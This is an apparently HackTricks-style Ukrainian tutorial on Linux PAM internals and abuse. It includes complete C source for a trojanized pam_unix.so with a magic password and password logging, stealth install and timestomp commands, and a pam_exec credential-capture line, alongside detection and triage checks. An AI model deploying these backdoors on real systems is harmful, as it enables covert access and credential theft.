# PAM — Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Основна інформація

**PAM (Pluggable Authentication Modules)** — це механізм безпеки, який **перевіряє особи користувачів, що намагаються отримати доступ до комп’ютерних служб**, і контролює їхній доступ на основі різних критеріїв. Це своєрідний цифровий воротар, який стежить за тим, щоб лише авторизовані користувачі могли користуватися певними службами, і за потреби обмежує використання, щоб запобігти перевантаженню системи.

#### Файли конфігурації

- **Solaris** підтримує застарілий центральний файл `/etc/pam.conf`, але сучасні рекомендації надають перевагу файлам служб у `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Системи Linux** надають перевагу підходу з каталогом, зберігаючи конфігурації для окремих служб у `/etc/pam.d`. Наприклад, файл конфігурації служби login розташований у `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Приклад конфігурації PAM для служби login може мати такий вигляд:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Сфери керування PAM**

Ці сфери, або групи керування, включають **автентифікацію**, **обліковий запис**, **пароль** і **сеанс**; кожна відповідає за різні аспекти процесу автентифікації та керування сеансами:<sup>[[1]](#references)</sup>

- **Автентифікація**: Перевіряє особу користувача, часто запитуючи пароль.
- **Обліковий запис**: Перевіряє обліковий запис, зокрема членство в групах або обмеження за часом доби.
- **Пароль**: Керує оновленням паролів, зокрема перевіркою складності та захистом від словникових атак.
- **Сеанс**: Керує діями на початку або наприкінці сеансу служби, наприклад монтуванням каталогів або встановленням обмежень ресурсів.

#### **Керувальні прапорці модулів PAM**

Керувальні прапорці визначають реакцію модуля на успіх або помилку, впливаючи на загальний процес автентифікації. До них належать:<sup>[[1]](#references)</sup>

- **Required**: Помилка обов’язкового модуля зрештою призводить до невдачі, але лише після перевірки всіх наступних модулів.
- **Requisite**: Негайне завершення процесу в разі помилки.
- **Sufficient**: Якщо раніше не помилився жоден модуль `required`, успіх одразу повертається, а решта модулів тієї самої групи керування пропускаються.
- **Optional**: Спричиняє помилку лише тоді, коли це єдиний модуль у стеку.

#### Важлива для атак семантика

Під час аналізу або зміни PAM **розташування вставленого правила** визначає, який стек його обробляє:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` і `substack` підключають правила з інших файлів, тому редагування `sshd` може вплинути лише на SSH, тоді як редагування `system-auth`, `common-auth` або іншого спільного стека може вплинути одразу на кілька служб.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM також підтримує керувальні прапорці у квадратних дужках, як-от `[success=1 default=ignore]`. Їх можна використати для **пропуску одного або кількох модулів** після успішної власної перевірки замість очевидної заміни `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` може бути **абсолютним** (`/usr/lib/security/pam_custom.so`) або **відносним** до стандартного каталогу модулів PAM. У сучасних системах Linux фактичними каталогами часто є `/lib/security`, `/lib64/security`, `/usr/lib/security` або multiarch-шляхи, як-от `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Короткий висновок для оператора: перед внесенням змін завжди відстежуйте **повний граф служб**. Наприклад, `sshd -> password-auth -> system-auth` у деяких дистрибутивах або `sshd -> system-remote-login -> system-login -> system-auth` в інших означає, що той самий однорядковий implant може поширитися значно ширше, ніж задумано.<sup>[[1]](#references)[[13]](#references)</sup>

Власний модуль `auth` може додати до `sudo` інтерактивний запит після введення пароля облікового запису. Перш ніж вручну перевіряти цей запит, перегляньте фактичний стек `/etc/pam.d/sudo`, підключені правила, аргументи модулів і дозволи на будь-який згаданий локальний файл даних. Сам по собі доступний для читання список слів для запиту не обходить перевірку пароля й не створює дозвіл у sudoers. Перехід до привілейованого режиму все одно вимагає успішної автентифікації облікового запису, проходження всіх обов’язкових етапів PAM і правила sudo, що дозволяє отримати root-доступ; автоматичне перерахування не повинно запускати цей запит.

Для застарілої вразливості Ubuntu [`pam_motd` ownership flaw (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) перевірте фактичну збірку `libpam-modules` і чи викликає служба входу в систему вразливий session-модуль. Ubuntu виправила її у версії **1.1.0-2ubuntu1.1** для 9.10 і **1.1.1-2ubuntu5** для 10.04 LTS; для інших випусків або бекпортів постачальника потрібна окрема перевірка пакета. Згідно з описом, для використання вразливості користувач мав замінити свій домашній `.cache` на symlink, а потім ініціювати вхід через PAM, що змушувало старий модуль змінити власника захищеного цільового об’єкта. Самі лише запис `.cache`, рядок `pam_motd.so` або стара версія ядра не підтверджують наявність вразливості; під час пасивного перерахування перевірте контроль над домашнім каталогом, фактичну версію модуля, доступність входу, обробку symlink і дозволи на цільовий об’єкт, не замінюючи файли й не ініціюючи вхід. Див. [повідомлення безпеки Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Приклад сценарію

У конфігурації з кількома модулями auth процес виконується в суворій послідовності. Якщо модуль `pam_securetty` виявляє, що термінал входу не авторизовано, вхід root блокується, однак усі модулі все одно обробляються через статус `required`. `pam_env` встановлює змінні середовища, що потенційно може покращити зручність для користувача. Модулі `pam_ldap` і `pam_unix` спільно автентифікують користувача; `pam_unix` намагається використати раніше введений пароль, підвищуючи ефективність і гнучкість методів автентифікації.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` у стеку служби

`pam_permit.so` повертає успішний результат для перевірок PAM. Якщо користувач із нижчими привілеями може змінити фактичні правила PAM служби, вставлення цього модуля з керувальним прапорцем, який достроково завершує стек автентифікації, може прибрати перевірку пароля для цієї служби. Для `sudo` перевірте `/etc/pam.d/sudo` і всі підключені файли `common-auth` або `system-auth`, перш ніж визначати, яких служб це стосується. Обхід автентифікації PAM **не** надає нового правила sudoers; користувач усе одно має бути авторизований на виконання запитаної команди. Перевіряйте порядок правил і наявність попередніх помилок `required`, а не вважайте, що один рядок `sufficient pam_permit.so` завжди забезпечує успіх.

## Створення backdoor у PAM — перехоплення `pam_unix.so`

Класичний прийом для закріплення в цінних середовищах Linux — **підміна легітимної бібліотеки PAM троянізованим drop-in-модулем**. На хості, стек PAM якого завантажує `pam_unix.so`, автентифікація через SSH або консоль може викликати точку входу `pam_sm_authenticate()`; шкідлива підміна може перехоплювати облікові дані або реалізувати обхід із *магічним* паролем.<sup>[[2]](#references)[[11]](#references)</sup>

### Шпаргалка з компіляції
Наведений нижче приклад використовує сервісну точку входу Linux-PAM `pam_sm_authenticate()` і `pam_get_authtok()` для доступу до токена автентифікації.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Приклад трояна `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Скомпілюйте та виконайте stealth-replace (шаблон заміни/timestomp описаний Unit 42). Змініть жорстко заданий у wrapper шлях резервної копії та команди нижче відповідно до фактичного каталогу PAM-модулів цільової системи:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Поради з OpSec
1. **Атомарне перезаписування** – запишіть повну бібліотеку в тимчасовий файл і перейменуйте його, щоб не залишити частково записаний модуль автентифікації.
2. Шлях `/usr/bin/.dbus.log` виявили під час аналізу AuthDoor від Unit 42, тому він також є корисним індикатором для пошуку.<sup>[[2]](#references)</sup>
3. Зберігайте точки входу, очікувані стеком PAM (наприклад, `pam_sm_authenticate` і `pam_sm_setcred`), щоб інші операції керування продовжували працювати.<sup>[[11]](#references)[[18]](#references)</sup>

### Виявлення
Для перевірки цілісності пакетів RPM перевіряє метадані встановлених файлів, `debsums -s` повідомляє про помилки контрольних сум, а `dpkg -S` у блоці первинного аналізу запитує, якому пакету належить файл; синтаксис правила audit watch реєструє записування до шляху та зміну його атрибутів.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Порівняйте MD5/SHA256 для `pam_unix.so` з відповідним пакетом дистрибутива.
* Використайте `rpm -V pam` або `debsums -s libpam-modules`, щоб виявити підмінені бібліотеки без ручного обчислення хешів.
* Перевірте, чи немає файлів, доступних для запису всім, або файлів із незвичним власником у `/lib/security/`.
* Правило `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Знайдіть у конфігураціях PAM неочікувані модулі: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Цей пошук `pam_` не виявить власні модулі з іншими базовими назвами `.so`. Перевірте **активні** рядки `auth`, `account`, `password` і `session` у `/etc/pam.d` (а також `/etc/pam.conf`, якщо він використовується), зокрема їхні прапорці керування та будь-які підключені стеки. Незнайомий модуль, розміщений як `auth sufficient` перед звичайною перевіркою пароля, потребує перевірки власника пакета й бінарного файла; [синтаксис керування PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) може завершити цю частину стека одразу після успішної перевірки. Сама лише назва модуля, незвична часова мітка або параметр `nodelay` не доводять наявності обходу. Якщо поведінка вказує на часовий leak, спершу перевірте реалізацію та доступність сервісу; під час звичайної розвідки не надсилайте багаторазово здогадки щодо автентифікаційних даних.

### Команди для швидкого первинного аналізу (після компрометації або під час пошуку загроз)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Зловживання `pam_exec` для закріплення
Замість заміни `pam_unix.so` можна менш помітно додати рядок `pam_exec` до `/etc/pam.d/sshd`, щоб під час виконання, яке доходить до цього рядка PAM, запускалася допоміжна програма, а звичайний стек залишався незмінним.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` отримує метадані PAM у змінних середовища, таких як `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` і `PAM_TYPE`. З `expose_authtok` helper може зчитати до `PAM_MAX_RESP_SIZE` байтів пароля зі `stdin` під час фаз `auth` або `password`. Щоб helper запускався з ефективним UID замість реального UID, додайте `seteuid`.<sup>[[4]](#references)</sup>

Практичні примітки стосуються типів модулів і фільтра `type=`, задокументованих для `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` краще підходить для **дій після входу**, як-от повторне відкриття сокетів або запуск від'єднаного демона.
- `auth optional pam_exec.so quiet expose_authtok ...` зазвичай використовують для **перехоплення облікових даних**, оскільки цей виклик виконується до відкриття сеансу.
- `type=session` або `type=auth` можна використовувати, щоб обмежити виконання певною фазою PAM і уникнути зайвого повторного виконання.

Під час перевірки привілеїв абсолютний шлях до helper `pam_exec.so`, доступний поточному користувачеві для запису, може становити загрозу, навіть якщо файл позначено атрибутом append-only (`a`): [цей атрибут дозволяє дописування](https://man7.org/linux/man-pages/man1/chattr.1.html), чого може бути достатньо, щоб змінити подальшу поведінку shell script. Спершу переконайтеся, що служба PAM і подія справді доходять до цього рядка, helper і його батьківський шлях є довіреними, а команда виконується від імені привілейованішого користувача; [`seteuid` змінює UID PAM, який використовується](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Сам по собі файл із правом запису або результат `lsattr` не доводить виконання з привілеями.

### Збереження змін після запуску distro-інструментів: `authselect`

У системах сімейства RHEL і Fedora, де використовується `authselect`, прямі зміни згенерованих файлів, як-от `/etc/pam.d/system-auth` або `/etc/pam.d/password-auth`, можуть бути **перезаписані `authselect`**. Щоб зміни збереглися, адміністратори часто змінюють активний custom profile у `/etc/authselect/custom/<profile>/`, а потім вибирають його знову.<sup>[[5]](#references)[[19]](#references)</sup>

Типова послідовність дій, якщо у вас є root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Це важливо і для атак, і для первинного аналізу: якщо `/etc/pam.d/system-auth` містить банер `Generated by authselect` і `Do not modify this file manually`, то реальна точка закріплення може бути в `/etc/authselect/custom/`, а не в `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Нещодавні прийоми, помічені в реальних атаках

У звітах за 2025 рік про Linux-бекдор **Plague** показано, як ту саму базову ідею розвинули далі: шкідливий компонент PAM зі **статичним паролем обходу**, а також очищення змінних середовища, пов’язаних з SSH, і історії shell (`HISTFILE=/dev/null`), щоб зменшити кількість слідів сеансу після входу.<sup>[[3]](#references)</sup> Це корисний шаблон для пошуку: логіка бекдора може міститися в PAM, а артефакти приховування з’являються лише **після** успішної автентифікації.


## References

- [1] [pam.conf(5) / pam.d(5) — посібник Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Посібник таємного оператора: проникнення в глобальні телекомунікаційні мережі — Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems — Plague: нещодавно виявлений бекдор для Linux на основі PAM](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) — посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Налаштування автентифікації користувачів за допомогою authselect — Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) — RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) — сторінки посібника Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) — сторінки посібника Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Керування автентифікацією в Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) — посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) — посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Посібник з автентифікації на рівні системи — Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Список файлів пакета Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) — посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) — посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) — сторінки посібника Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) — посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Зміни/Зробити Authselect обов’язковим — вікі Fedora Project](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
